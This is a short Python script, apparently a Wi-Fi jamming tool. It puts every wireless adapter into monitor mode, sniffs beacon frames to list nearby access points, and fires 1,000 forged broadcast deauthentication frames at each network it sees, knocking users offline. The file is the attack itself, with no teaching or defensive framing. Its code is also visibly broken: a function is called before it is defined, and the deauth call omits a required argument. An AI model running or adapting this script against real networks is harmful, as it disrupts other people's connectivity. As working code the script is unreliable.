#!/usr/bin/env python

from scapy import *
from scapy.all import *
import psutil
from scapy.all import *
import pandas
import os
import psutil
# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)
interfaces = get_interfaces()

def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        crypto = str(crypto).strip("{'").strip("'}")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)
        deauth(interfaces[-1])


def deauth(interface, bssid_addr, destination_addr = 'ff:ff:ff:ff:ff:ff'):
    dot11 = Dot11(addr1=destination_addr, addr2=bssid_addr, addr3=bssid_addr)
    pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(pkt, iface=interface, inter=0.1, count=1000, verbose=1)


# Changes wireless adapters from managed to monitor
def change_mode(interface):
    for each_interface in interfaces:
        os.system(f"ifconfig {each_interface} down")
        os.system(f"iwconfig {each_interface} mode monitor")
        os.system(f"ifconfig {each_interface} up")


# Gets Wireless adapters that aren't the main wifi card.
# Could be an issue as I made the assumption that the first card is the main card
def get_interfaces():
    addresses = psutil.net_if_addrs()
    stats = psutil.net_if_stats()

    wireless_interfaces = []
    for intface, addr_list in addresses.items():
        if  intface[:2] == "wl":
            wireless_interfaces.append(intface)
    return wireless_interfaces

if __name__ == "__main__":
    change_mode(interfaces)
    sniff(prn=callback, iface=interfaces[1])